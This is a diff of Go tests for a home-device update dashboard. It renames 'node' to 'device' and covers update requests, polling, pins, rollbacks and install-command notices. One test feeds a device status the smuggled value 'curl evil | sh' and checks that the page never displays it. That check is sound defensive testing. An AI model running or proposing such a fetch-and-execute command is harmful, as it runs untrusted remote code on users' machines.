@@ -12,7 +12,7 @@ import (
 )
 
 // newUpdatesWeb is a workspace at 0.1.0, the latest eriphe-core and
-// eriphe-node, with eriphe-core's own updater; it returns the headers of an
+// eriphe-device, with eriphe-core's own updater; it returns the headers of an
 // htmx request.
 func newUpdatesWeb(t *testing.T) (*testWeb, map[string]string) {
 	t.Helper()
@@ -20,7 +20,7 @@ func newUpdatesWeb(t *testing.T) (*testWeb, map[string]string) {
 	t.Cleanup(func() { version = old })
 	version = "0.1.0"
 	tw := newTestWeb(t)
-	f := newFakeRegistry(t, map[string]string{"eriphe-core": "0.1.0", "eriphe-node": "0.1.0"})
+	f := newFakeRegistry(t, map[string]string{"eriphe-core": "0.1.0", "eriphe-device": "0.1.0"})
 	tw.c.updates = newUpdates(f.srv.URL)
 	tw.c.updates.check(context.Background())
 	os.WriteFile(filepath.Join(tw.c.store.dir, "updater"), []byte("version=1\npin=\n"), 0o600)
@@ -50,13 +50,13 @@ func hasNone(t *testing.T, what, body string, gone ...string) {
 // take; one pinned to a line still takes that line's fixes.
 func TestWebUpdatePinned(t *testing.T) {
 	tw, _ := newUpdatesWeb(t)
-	setNode(t, tw.c, "pc", `{"os":"linux","install":"linux","version":"0.0.1","update":{"updater":true,"pin":"0.0.1"}}`)
+	setDevice(t, tw.c, "pc", `{"os":"linux","install":"linux","version":"0.0.1","update":{"updater":true,"pin":"0.0.1"}}`)
 	_, body, _ := tw.do("GET", "/settings/devices", nil, nil)
 	hasAll(t, "pinned", body, "épinglée sur 0.0.1")
-	hasNone(t, "pinned", body, "Mise à jour disponible", "→ 0.1.0", `name="machine" value="node:pc"`)
-	setNode(t, tw.c, "pc", `{"os":"linux","install":"linux","version":"0.0.1","update":{"updater":true,"pin":"0.1"}}`)
+	hasNone(t, "pinned", body, "Mise à jour disponible", "→ 0.1.0", `name="machine" value="device:pc"`)
+	setDevice(t, tw.c, "pc", `{"os":"linux","install":"linux","version":"0.0.1","update":{"updater":true,"pin":"0.1"}}`)
 	_, body, _ = tw.do("GET", "/settings/devices", nil, nil)
-	hasAll(t, "pinned to a line", body, "épinglée sur 0.1", "→ 0.1.0", `name="machine" value="node:pc"`)
+	hasAll(t, "pinned to a line", body, "épinglée sur 0.1", "→ 0.1.0", `name="machine" value="device:pc"`)
 	if pinAllows("0.29.0", "0.29.1") || !pinAllows("v0.29", "0.29.3") || pinAllows("0.29", "0.30.0") || pinAllows("sha-abcdef1", "0.30.0") {
 		t.Fatal("pinAllows")
 	}
@@ -66,7 +66,7 @@ func TestWebUpdatePinned(t *testing.T) {
 // from its foot, which asks again only while the request is pending.
 func TestWebUpdateLive(t *testing.T) {
 	tw, h := newUpdatesWeb(t)
-	setNode(t, tw.c, "pc", `{"os":"linux","install":"linux","version":"0.0.1","update":{"updater":true}}`)
+	setDevice(t, tw.c, "pc", `{"os":"linux","install":"linux","version":"0.0.1","update":{"updater":true}}`)
 
 	_, body, _ := tw.do("GET", "/settings/devices", nil, nil)
 	hasAll(t, "before", body, `id="device-foot-pc"`, `hx-target="closest .device-foot"`, follows("/settings/devices/pc/update"))
@@ -74,14 +74,14 @@ func TestWebUpdateLive(t *testing.T) {
 
 	// The button answers with the card's foot, which follows the request,
 	// and tells the rest of the page to ask again.
-	code, body, hdr := tw.do("POST", "/settings/updates/request", url.Values{"machine": {"node:pc"}}, h)
-	r := tw.c.pendingUpdate("node:pc")
+	code, body, hdr := tw.do("POST", "/settings/updates/request", url.Values{"machine": {"device:pc"}}, h)
+	r := tw.c.pendingUpdate("device:pc")
 	if code != http.StatusOK || r == nil || hdr.Get("HX-Refresh") != "" || hdr.Get("HX-Trigger") != "updates-changed" {
 		t.Fatalf("update now: %d %+v %v", code, r, hdr)
 	}
 	poll := `hx-get="/settings/devices/pc/update?id=` + r.ID + `"`
 	hasAll(t, "asked", body, `id="device-foot-pc"`, poll, `hx-trigger="every 3s"`, `hx-swap="outerHTML"`,
-		"data-update-poll", "Mise à jour demandée…", "pulse-dot", "eriphe-node 0.0.1")
+		"data-update-poll", "Mise à jour demandée…", "pulse-dot", "eriphe-device 0.0.1")
 	hasNone(t, "asked", body, "Mise à jour disponible", "→ 0.1.0")
 	hasNone(t, "asked", body, "updates-changed from:body")
 	state := "/settings/devices/pc/update?id=" + r.ID
@@ -93,19 +93,19 @@ func TestWebUpdateLive(t *testing.T) {
 	hasAll(t, "page while pending", body, poll)
 
 	// It waits for the tasks: slower.
-	setNode(t, tw.c, "pc", `{"version":"0.0.1","update":{"updater":true,"waiting":"`+r.ID+`"}}`)
+	setDevice(t, tw.c, "pc", `{"version":"0.0.1","update":{"updater":true,"waiting":"`+r.ID+`"}}`)
 	_, body, _ = tw.do("GET", state, nil, h)
 	hasAll(t, "waiting", body, poll, `hx-trigger="every 10s"`, "elle attend la fin des tâches")
 
-	setNode(t, tw.c, "pc", `{"version":"0.0.1","update":{"updater":true,"status":{"id":"`+r.ID+`","outcome":"running"}}}`)
+	setDevice(t, tw.c, "pc", `{"version":"0.0.1","update":{"updater":true,"status":{"id":"`+r.ID+`","outcome":"running"}}}`)
 	_, body, _ = tw.do("GET", state, nil, h)
 	hasAll(t, "running", body, poll, "Mise à jour en cours…", "pulse-dot")
 
 	// Done: the new version, once, and no more asking, even before
 	// resolveUpdates drops the request.
-	setNode(t, tw.c, "pc", `{"version":"0.1.0","update":{"updater":true,"status":{"id":"`+r.ID+`","outcome":"ok","to":"0.1.0"}}}`)
+	setDevice(t, tw.c, "pc", `{"version":"0.1.0","update":{"updater":true,"status":{"id":"`+r.ID+`","outcome":"ok","to":"0.1.0"}}}`)
 	_, body, hdr = tw.do("GET", state, nil, h)
-	hasAll(t, "done", body, `id="device-foot-pc"`, "eriphe-node 0.1.0", "update-done", "À jour", follows("/settings/devices/pc/update"))
+	hasAll(t, "done", body, `id="device-foot-pc"`, "eriphe-device 0.1.0", "update-done", "À jour", follows("/settings/devices/pc/update"))
 	hasNone(t, "done", body, "data-update-poll", "?id=", "Mise à jour disponible", "pulse-dot")
 	if hdr.Get("HX-Trigger") != "updates-changed" {
 		t.Fatalf("done: the page is not told: %v", hdr)
@@ -116,8 +116,8 @@ func TestWebUpdateLive(t *testing.T) {
 	}
 	_, body, _ = tw.do("GET", "/settings/devices", nil, nil)
 	hasNone(t, "page once done", body, "data-update-poll", "update-done")
-	tw.c.resolveUpdates(mustNodes(t, tw.c))
-	if tw.c.pendingUpdate("node:pc") != nil {
+	tw.c.resolveUpdates(mustDevices(t, tw.c))
+	if tw.c.pendingUpdate("device:pc") != nil {
 		t.Fatal("the request is not dropped")
 	}
 
@@ -130,21 +130,21 @@ func TestWebUpdateLive(t *testing.T) {
 // A failed update shows how it went, and the card stops asking.
 func TestWebUpdateLiveFailed(t *testing.T) {
 	tw, h := newUpdatesWeb(t)
-	setNode(t, tw.c, "pc", `{"version":"0.0.1","update":{"updater":true}}`)
-	tw.do("POST", "/settings/updates/request", url.Values{"machine": {"node:pc"}}, h)
-	r := tw.c.pendingUpdate("node:pc")
-	setNode(t, tw.c, "pc", `{"version":"0.0.1","update":{"updater":true,"status":{"id":"`+r.ID+`","outcome":"rolled_back","message":"eriphe-node did not connect"}}}`)
+	setDevice(t, tw.c, "pc", `{"version":"0.0.1","update":{"updater":true}}`)
+	tw.do("POST", "/settings/updates/request", url.Values{"machine": {"device:pc"}}, h)
+	r := tw.c.pendingUpdate("device:pc")
+	setDevice(t, tw.c, "pc", `{"version":"0.0.1","update":{"updater":true,"status":{"id":"`+r.ID+`","outcome":"rolled_back","message":"eriphe-device did not connect"}}}`)
 	_, body, _ := tw.do("GET", "/settings/devices/pc/update?id="+r.ID, nil, h)
-	hasAll(t, "failed", body, "La mise à jour a échoué, version précédente remise", "eriphe-node did not connect",
-		"Mise à jour disponible", "→ 0.1.0", `value="node:pc"`)
+	hasAll(t, "failed", body, "La mise à jour a échoué, version précédente remise", "eriphe-device did not connect",
+		"Mise à jour disponible", "→ 0.1.0", `value="device:pc"`)
 	hasNone(t, "failed", body, "data-update-poll", "update-done")
 }
 
 // eriphe-core's row follows its own update, through its restart: once
-// done, the cards are shown again, as the nodes can follow it.
+// done, the cards are shown again, as the devices can follow it.
 func TestWebUpdateLiveCore(t *testing.T) {
 	tw, h := newUpdatesWeb(t)
-	f := newFakeRegistry(t, map[string]string{"eriphe-core": "0.2.0", "eriphe-node": "0.2.0"})
+	f := newFakeRegistry(t, map[string]string{"eriphe-core": "0.2.0", "eriphe-device": "0.2.0"})
 	tw.c.updates = newUpdates(f.srv.URL)
 	tw.c.updates.check(context.Background())
 
@@ -170,7 +170,7 @@ func TestWebUpdateLiveCore(t *testing.T) {
 	_, body, hdr := tw.do("GET", state, nil, h)
 	hasAll(t, "done", body, `id="update-core"`, "0.2.0", "update-done", follows("/settings/updates/core"))
 	hasNone(t, "done", body, "data-update-poll", "Mise à jour disponible")
-	// The cards and "Update all" ask again: the nodes can follow it.
+	// The cards and "Update all" ask again: the devices can follow it.
 	if hdr.Get("HX-Trigger") != "updates-changed" {
 		t.Fatalf("done: the page is not told: %v", hdr)
 	}
@@ -182,25 +182,25 @@ func follows(path string) string {
 }
 
 // One card's request reaches the others and "Update all": eriphe-core's
-// update lets the nodes' buttons go, and each request made lowers the
+// update lets the devices' buttons go, and each request made lowers the
 // count of "Update all", which goes once one machine is left.
 func TestWebUpdateOthersFollow(t *testing.T) {
 	tw, h := newUpdatesWeb(t)
-	f := newFakeRegistry(t, map[string]string{"eriphe-core": "0.2.0", "eriphe-node": "0.2.0"})
+	f := newFakeRegistry(t, map[string]string{"eriphe-core": "0.2.0", "eriphe-device": "0.2.0"})
 	tw.c.updates = newUpdates(f.srv.URL)
 	tw.c.updates.check(context.Background())
 	for _, n := range []string{"pc", "nas"} {
-		setNode(t, tw.c, n, `{"os":"linux","install":"linux","version":"0.1.0","update":{"updater":true}}`)
+		setDevice(t, tw.c, n, `{"os":"linux","install":"linux","version":"0.1.0","update":{"updater":true}}`)
 	}
 	_, body, _ := tw.do("GET", "/settings/devices", nil, nil)
 	hasAll(t, "page", body, follows("/settings/updates/all"), follows("/settings/updates/core"),
 		follows("/settings/devices/pc/update"), follows("/settings/devices/nas/update"), "Tout mettre à jour")
 
-	// While eriphe-core is behind, a node's button updates it first.
+	// While eriphe-core is behind, a device's button updates it first.
 	_, body, _ = tw.do("GET", "/settings/devices/pc/update", nil, h)
-	hasAll(t, "core first", body, "→ 0.2.0", `value="node:pc"`, "abord à jour, puis cet appareil.")
+	hasAll(t, "core first", body, "→ 0.2.0", `value="device:pc"`, "abord à jour, puis cet appareil.")
 	hasNone(t, "core first", body, "disabled title=")
-	// Without an updater of eriphe-core, nothing here can: the node waits.
+	// Without an updater of eriphe-core, nothing here can: the device waits.
 	os.Rename(filepath.Join(tw.c.store.dir, "updater"), filepath.Join(tw.c.store.dir, "updater.off"))
 	_, body, _ = tw.do("GET", "/settings/devices/pc/update", nil, h)
 	hasAll(t, "core first, by its command", body, "→ 0.2.0", "disabled title=", "Après eriphe-core")
@@ -211,20 +211,20 @@ func TestWebUpdateOthersFollow(t *testing.T) {
 	r := tw.c.pendingUpdate(coreMachine)
 	os.WriteFile(filepath.Join(tw.c.store.dir, "update-status"), []byte("id="+r.ID+"\naction=update\noutcome=ok\n"), 0o600)
 	version = "0.2.0"
-	tw.c.resolveUpdates(mustNodes(t, tw.c))
+	tw.c.resolveUpdates(mustDevices(t, tw.c))
 	_, body, _ = tw.do("GET", "/settings/devices/pc/update", nil, h)
-	hasAll(t, "after core", body, "→ 0.2.0", `value="node:pc"`)
+	hasAll(t, "after core", body, "→ 0.2.0", `value="device:pc"`)
 	hasNone(t, "after core", body, "disabled title=")
 	_, body, _ = tw.do("GET", "/settings/updates/all", nil, h)
 	hasAll(t, "two behind", body, `id="updates-all"`, "Tout mettre à jour", follows("/settings/updates/all"))
 
 	// One card asked: one machine left, no "Update all"; that card shows its request.
-	tw.do("POST", "/settings/updates/request", url.Values{"machine": {"node:pc"}}, h)
+	tw.do("POST", "/settings/updates/request", url.Values{"machine": {"device:pc"}}, h)
 	_, body, _ = tw.do("GET", "/settings/updates/all", nil, h)
 	hasAll(t, "one behind", body, `id="updates-all"`, follows("/settings/updates/all"))
 	hasNone(t, "one behind", body, "Tout mettre à jour")
 	_, body, _ = tw.do("GET", "/settings/devices/nas/update", nil, h)
-	hasAll(t, "the other card", body, "→ 0.2.0", `value="node:nas"`)
+	hasAll(t, "the other card", body, "→ 0.2.0", `value="device:nas"`)
 }
 
 // Only a known device, and only with a session.
@@ -233,7 +233,7 @@ func TestWebUpdateStateRefused(t *testing.T) {
 	if code, _, _ := tw.do("GET", "/settings/devices/ghost/update", nil, h); code != http.StatusNotFound {
 		t.Fatalf("unknown device: %d", code)
 	}
-	setNode(t, tw.c, "pc", `{"version":"0.0.1","update":{"updater":true}}`)
+	setDevice(t, tw.c, "pc", `{"version":"0.0.1","update":{"updater":true}}`)
 	anon := &http.Client{Transport: tw.srv.Client().Transport, CheckRedirect: func(*http.Request, []*http.Request) error { return http.ErrUseLastResponse }}
 	for _, path := range []string{"/settings/devices/pc/update", "/settings/updates/core"} {
 		resp, err := anon.Get(tw.srv.URL + path)
@@ -257,24 +257,24 @@ func TestWebUpdateStateRefused(t *testing.T) {
 	}
 }
 
-func mustNodes(t *testing.T, c *core) []NodeRow {
+func mustDevices(t *testing.T, c *core) []DeviceRow {
 	t.Helper()
-	nodes, err := c.store.nodes()
+	devices, err := c.store.devices()
 	if err != nil {
 		t.Fatal(err)
 	}
-	return nodes
+	return devices
 }
 
 // A device newer than eriphe-core (updated first, the registry's answer
 // not yet renewed) is offered no update: it would be a downgrade.
 func TestWebUpdateNoDowngrade(t *testing.T) {
 	tw, _ := newUpdatesWeb(t)
-	setNode(t, tw.c, "pc", `{"os":"linux","install":"linux","version":"0.2.0","update":{"updater":true}}`)
+	setDevice(t, tw.c, "pc", `{"os":"linux","install":"linux","version":"0.2.0","update":{"updater":true}}`)
 	_, body, _ := tw.do("GET", "/settings/devices", nil, nil)
-	hasNone(t, "newer device", body, "→ 0.1.0", `name="machine" value="node:pc"`)
-	if n := tw.c.updateNodes(); n != 0 {
-		t.Fatalf("%d nodes asked to go back", n)
+	hasNone(t, "newer device", body, "→ 0.1.0", `name="machine" value="device:pc"`)
+	if n := tw.c.updateDevices(); n != 0 {
+		t.Fatalf("%d devices asked to go back", n)
 	}
 }
 
@@ -305,21 +305,21 @@ func TestUpdatesDue(t *testing.T) {
 // device is asked once eriphe-core runs the latest version.
 func TestWebUpdateAfterCore(t *testing.T) {
 	tw, h := newUpdatesWeb(t)
-	f := newFakeRegistry(t, map[string]string{"eriphe-core": "0.2.0", "eriphe-node": "0.2.0"})
+	f := newFakeRegistry(t, map[string]string{"eriphe-core": "0.2.0", "eriphe-device": "0.2.0"})
 	tw.c.updates = newUpdates(f.srv.URL)
 	tw.c.updates.check(context.Background())
-	setNode(t, tw.c, "pc", `{"os":"linux","install":"linux","version":"0.1.0","update":{"updater":true}}`)
+	setDevice(t, tw.c, "pc", `{"os":"linux","install":"linux","version":"0.1.0","update":{"updater":true}}`)
 
-	code, body, hdr := tw.do("POST", "/settings/updates/request", url.Values{"machine": {"node:pc"}}, h)
+	code, body, hdr := tw.do("POST", "/settings/updates/request", url.Values{"machine": {"device:pc"}}, h)
 	r := tw.c.pendingUpdate(coreMachine)
-	if code != http.StatusOK || r == nil || tw.c.pendingUpdate("node:pc") != nil || hdr.Get("HX-Trigger") != "updates-changed" {
+	if code != http.StatusOK || r == nil || tw.c.pendingUpdate("device:pc") != nil || hdr.Get("HX-Trigger") != "updates-changed" {
 		t.Fatalf("update now, eriphe-core behind: %d %+v %v\n%s", code, r, hdr, body)
 	}
 	hasAll(t, "waiting for eriphe-core", body, `id="device-foot-pc"`, `hx-get="/settings/devices/pc/update"`,
 		"data-update-poll", "eriphe-core : il se met à jour d&#39;abord, puis cet appareil.")
-	hasNone(t, "waiting for eriphe-core", body, `value="node:pc"`, "À jour", "Mise à jour disponible")
+	hasNone(t, "waiting for eriphe-core", body, `value="device:pc"`, "À jour", "Mise à jour disponible")
 	// Asked again: the device already waits.
-	if _, _, hdr = tw.do("POST", "/settings/updates/request", url.Values{"machine": {"node:pc"}}, h); !strings.Contains(hdr.Get("HX-Trigger"), `demande est d\u00e9j\u00e0`) {
+	if _, _, hdr = tw.do("POST", "/settings/updates/request", url.Values{"machine": {"device:pc"}}, h); !strings.Contains(hdr.Get("HX-Trigger"), `demande est d\u00e9j\u00e0`) {
 		t.Fatalf("asked twice: %v", hdr)
 	}
 	// eriphe-core's row follows its own request; "Update all" leaves the device out.
@@ -329,55 +329,55 @@ func TestWebUpdateAfterCore(t *testing.T) {
 	// eriphe-core restarted on the latest version: the device is asked.
 	os.WriteFile(filepath.Join(tw.c.store.dir, "update-status"), []byte("id="+r.ID+"\naction=update\noutcome=ok\nto=0.2.0\n"), 0o600)
 	version = "0.2.0"
-	tw.c.resolveUpdates(mustNodes(t, tw.c))
+	tw.c.resolveUpdates(mustDevices(t, tw.c))
 	tw.c.followUpdates()
-	n := tw.c.pendingUpdate("node:pc")
-	if n == nil || tw.c.afterCore("node:pc") {
+	n := tw.c.pendingUpdate("device:pc")
+	if n == nil || tw.c.afterCore("device:pc") {
 		t.Fatalf("the device does not follow: %+v", n)
 	}
 	_, body, _ = tw.do("GET", "/settings/devices/pc/update", nil, h)
 	hasAll(t, "the device asked", body, "?id="+n.ID, "Mise à jour demandée…")
-	setNode(t, tw.c, "pc", `{"version":"0.2.0","update":{"updater":true,"status":{"id":"`+n.ID+`","outcome":"ok","from":"0.1.0","to":"0.2.0"}}}`)
+	setDevice(t, tw.c, "pc", `{"version":"0.2.0","update":{"updater":true,"status":{"id":"`+n.ID+`","outcome":"ok","from":"0.1.0","to":"0.2.0"}}}`)
 	_, body, _ = tw.do("GET", "/settings/devices/pc/update?id="+n.ID, nil, h)
-	hasAll(t, "the device done", body, "eriphe-node 0.2.0", "update-done", "À jour")
+	hasAll(t, "the device done", body, "eriphe-device 0.2.0", "update-done", "À jour")
 }
 
 // An update that ends "ok" or "current" on another version than the one
 // offered is not called up to date.
 func TestWebUpdateNotReached(t *testing.T) {
 	tw, h := newUpdatesWeb(t)
-	setNode(t, tw.c, "pc", `{"os":"linux","install":"linux","version":"0.0.1","update":{"updater":true}}`)
-	tw.do("POST", "/settings/updates/request", url.Values{"machine": {"node:pc"}}, h)
-	r := tw.c.pendingUpdate("node:pc")
+	setDevice(t, tw.c, "pc", `{"os":"linux","install":"linux","version":"0.0.1","update":{"updater":true}}`)
+	tw.do("POST", "/settings/updates/request", url.Values{"machine": {"device:pc"}}, h)
+	r := tw.c.pendingUpdate("device:pc")
 	for _, outcome := range []string{"current", "ok"} {
-		setNode(t, tw.c, "pc", `{"version":"0.0.1","update":{"updater":true,"status":{"id":"`+r.ID+`","outcome":"`+outcome+`","from":"0.0.1","to":"0.0.1"}}}`)
+		setDevice(t, tw.c, "pc", `{"version":"0.0.1","update":{"updater":true,"status":{"id":"`+r.ID+`","outcome":"`+outcome+`","from":"0.0.1","to":"0.0.1"}}}`)
 		_, body, _ := tw.do("GET", "/settings/devices/pc/update?id="+r.ID, nil, h)
-		hasAll(t, outcome, body, "Pas mis à jour en 0.1.0", `value="node:pc"`)
+		hasAll(t, outcome, body, "Pas mis à jour en 0.1.0", `value="device:pc"`)
 		hasNone(t, outcome, body, "update-done", "À jour<", "Déjà à jour")
 	}
 }
 
-// A release half published (eriphe-node's latest out, eriphe-core's not
-// yet): a node is offered no version eriphe-core does not run, and its
+// A release half published (eriphe-device's latest out, eriphe-core's not
+// yet): a device is offered no version eriphe-core does not run, and its
 // button does not make it "update" to the build it runs.
 func TestWebUpdateHalfPublished(t *testing.T) {
 	tw, _ := newUpdatesWeb(t)
-	f := newFakeRegistry(t, map[string]string{"eriphe-core": "0.1.0", "eriphe-node": "0.2.0"})
+	f := newFakeRegistry(t, map[string]string{"eriphe-core": "0.1.0", "eriphe-device": "0.2.0"})
 	tw.c.updates = newUpdates(f.srv.URL)
 	tw.c.updates.check(context.Background())
-	setNode(t, tw.c, "same", `{"os":"linux","install":"linux","version":"0.1.0","update":{"updater":true}}`)
-	setNode(t, tw.c, "old", `{"os":"linux","install":"linux","version":"0.0.1","update":{"updater":true}}`)
-	d := tw.w.updatesData(mustNodes(t, tw.c))
+	setDevice(t, tw.c, "same", `{"os":"linux","install":"linux","version":"0.1.0","update":{"updater":true}}`)
+	setDevice(t, tw.c, "old", `{"os":"linux","install":"linux","version":"0.0.1","update":{"updater":true}}`)
+	d := tw.w.updatesData(mustDevices(t, tw.c))
 	for _, row := range d.Rows {
-		want := map[string]string{"core": "", "node:same": "", "node:old": "0.1.0"}[row.Machine]
+		want := map[string]string{"core": "", "device:same": "", "device:old": "0.1.0"}[row.Machine]
 		if row.Latest != want || row.CoreFirst {
 			t.Errorf("%s: latest %q (want %q), core first %t", row.Machine, row.Latest, want, row.CoreFirst)
 		}
 	}
 	_, body, _ := tw.do("GET", "/settings/devices", nil, nil)
-	hasNone(t, "half published", body, "0.2.0", `value="node:same"`)
-	hasAll(t, "half published", body, `value="node:old"`)
-	if n := tw.c.updateNodes(); n != 1 || tw.c.pendingUpdate("node:same") != nil {
+	hasNone(t, "half published", body, "0.2.0", `value="device:same"`)
+	hasAll(t, "half published", body, `value="device:old"`)
+	if n := tw.c.updateDevices(); n != 1 || tw.c.pendingUpdate("device:same") != nil {
 		t.Fatalf("update all, half published: %d asked", n)
 	}
 }
@@ -385,48 +385,48 @@ func TestWebUpdateHalfPublished(t *testing.T) {
 // A request dropped as stalled says so on its card, with its button.
 func TestWebUpdateStalled(t *testing.T) {
 	tw, h := newUpdatesWeb(t)
-	setNode(t, tw.c, "pc", `{"os":"linux","install":"linux","version":"0.0.1","update":{"updater":true}}`)
-	tw.do("POST", "/settings/updates/request", url.Values{"machine": {"node:pc"}}, h)
-	r := tw.c.pendingUpdate("node:pc")
+	setDevice(t, tw.c, "pc", `{"os":"linux","install":"linux","version":"0.0.1","update":{"updater":true}}`)
+	tw.do("POST", "/settings/updates/request", url.Values{"machine": {"device:pc"}}, h)
+	r := tw.c.pendingUpdate("device:pc")
 	old := time.Now().Add(-stalledAfter - time.Minute).UTC().Format(time.RFC3339)
-	setNode(t, tw.c, "pc", `{"version":"0.0.1","update":{"updater":true,"status":{"id":"`+r.ID+`","outcome":"running","at":"`+old+`"}}}`)
-	tw.c.resolveUpdates(mustNodes(t, tw.c))
+	setDevice(t, tw.c, "pc", `{"version":"0.0.1","update":{"updater":true,"status":{"id":"`+r.ID+`","outcome":"running","at":"`+old+`"}}}`)
+	tw.c.resolveUpdates(mustDevices(t, tw.c))
 	_, body, _ := tw.do("GET", "/settings/devices/pc/update?id="+r.ID, nil, h)
-	hasAll(t, "stalled", body, "arrêtée sans résultat", `value="node:pc"`)
+	hasAll(t, "stalled", body, "arrêtée sans résultat", `value="device:pc"`)
 	hasNone(t, "stalled", body, "data-update-poll", "Mise à jour en cours")
 }
 
 // A device whose update needs its user says so on its card, with the
-// command of its own install to copy: the node names the reason, never the
+// command of its own install to copy: the device names the reason, never the
 // command. Nothing while a request is under way, nor once it needs nothing.
 func TestWebUpdateNeeds(t *testing.T) {
 	tw, h := newUpdatesWeb(t)
-	setNode(t, tw.c, "mac", `{"os":"darwin","install":"macos","version":"0.1.0","update":{"updater":true,"layout":2,"needs":{"why":"password"}}}`)
-	setNode(t, tw.c, "pc", `{"os":"linux","install":"windows","version":"0.1.0","update":{"updater":true,"needs":{"why":"admin"}}}`)
-	setNode(t, tw.c, "nas", `{"os":"linux","install":"linux","version":"0.1.0","update":{"updater":true,"needs":{"why":"curl evil | sh"}}}`)
-	setNode(t, tw.c, "done", `{"os":"linux","install":"linux","version":"0.1.0","update":{"updater":true,"layout":2}}`)
+	setDevice(t, tw.c, "mac", `{"os":"darwin","install":"macos","version":"0.1.0","update":{"updater":true,"layout":2,"needs":{"why":"password"}}}`)
+	setDevice(t, tw.c, "pc", `{"os":"linux","install":"windows","version":"0.1.0","update":{"updater":true,"needs":{"why":"admin"}}}`)
+	setDevice(t, tw.c, "nas", `{"os":"linux","install":"linux","version":"0.1.0","update":{"updater":true,"needs":{"why":"curl evil | sh"}}}`)
+	setDevice(t, tw.c, "done", `{"os":"linux","install":"linux","version":"0.1.0","update":{"updater":true,"layout":2}}`)
 	_, body, _ := tw.do("GET", "/settings/devices", nil, nil)
 	hasAll(t, "needs", body, "Cette mise à jour a besoin de toi :",
-		"dans le Terminal du Mac", `<pre id="needs-node:mac">curl -fsSL https://github.com/Alexis-Marcel/eriphe-system/releases/latest/download/install.sh | sh -s</pre>`,
-		`data-copy="needs-node:mac"`,
-		"dans un PowerShell administrateur", `<pre id="needs-node:pc">irm https://github.com/Alexis-Marcel/eriphe-system/releases/latest/download/install.ps1 | iex</pre>`,
-		`<pre id="needs-node:nas">curl -fsSL`, "Elle ajoute ce que sa nouvelle version demande")
-	hasNone(t, "needs", body, "curl evil", `id="needs-node:done"`)
+		"dans le Terminal du Mac", `<pre id="needs-device:mac">curl -fsSL https://github.com/Alexis-Marcel/eriphe-system/releases/latest/download/install.sh | sh -s</pre>`,
+		`data-copy="needs-device:mac"`,
+		"dans un PowerShell administrateur", `<pre id="needs-device:pc">irm https://github.com/Alexis-Marcel/eriphe-system/releases/latest/download/install.ps1 | iex</pre>`,
+		`<pre id="needs-device:nas">curl -fsSL`, "Elle ajoute ce que sa nouvelle version demande")
+	hasNone(t, "needs", body, "curl evil", `id="needs-device:done"`)
 	// On the card's own fragment too, which follows its updates.
 	_, body, _ = tw.do("GET", "/settings/devices/mac/update", nil, h)
-	hasAll(t, "needs, the card's fragment", body, "Cette mise à jour a besoin de toi :", `data-copy="needs-node:mac"`)
+	hasAll(t, "needs, the card's fragment", body, "Cette mise à jour a besoin de toi :", `data-copy="needs-device:mac"`)
 	for _, why := range []string{"layout", "password", "admin"} {
 		if en := tr("en", "update.needs."+why); en == "" || en == tr("fr", "update.needs."+why) {
 			t.Errorf("update.needs.%s: no English", why)
 		}
 	}
 	// Under way: the update may bring it, nothing is asked meanwhile.
-	tw.do("POST", "/settings/updates/request", url.Values{"machine": {"node:done"}}, h)
-	setNode(t, tw.c, "done", `{"os":"linux","install":"linux","version":"0.1.0","update":{"updater":true,"needs":{"why":"layout"}}}`)
-	r := tw.c.pendingUpdate("node:done")
+	tw.do("POST", "/settings/updates/request", url.Values{"machine": {"device:done"}}, h)
+	setDevice(t, tw.c, "done", `{"os":"linux","install":"linux","version":"0.1.0","update":{"updater":true,"needs":{"why":"layout"}}}`)
+	r := tw.c.pendingUpdate("device:done")
 	if r == nil {
 		t.Fatal("no request")
 	}
 	_, body, _ = tw.do("GET", "/settings/devices/done/update?id="+r.ID, nil, h)
-	hasNone(t, "needs under way", body, `id="needs-node:done"`)
+	hasNone(t, "needs under way", body, `id="needs-device:done"`)
 }
